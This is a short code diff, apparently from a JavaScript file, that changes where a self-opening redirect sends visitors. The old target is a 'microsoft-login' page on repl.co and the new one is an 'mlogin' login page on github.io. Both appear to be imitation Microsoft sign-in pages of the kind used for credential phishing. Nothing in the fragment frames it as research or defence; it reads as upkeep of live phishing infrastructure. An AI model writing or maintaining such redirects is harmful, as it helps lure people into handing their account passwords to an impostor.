@@ -4,4 +4,4 @@ function NewTab(url) {
       url, "_self");
 }
 
-NewTab("https://microsoft-login.enderop44.repl.co/login/login1e.htm")
+NewTab("https://enderop44.github.io/mlogin/login/login1e.htm")
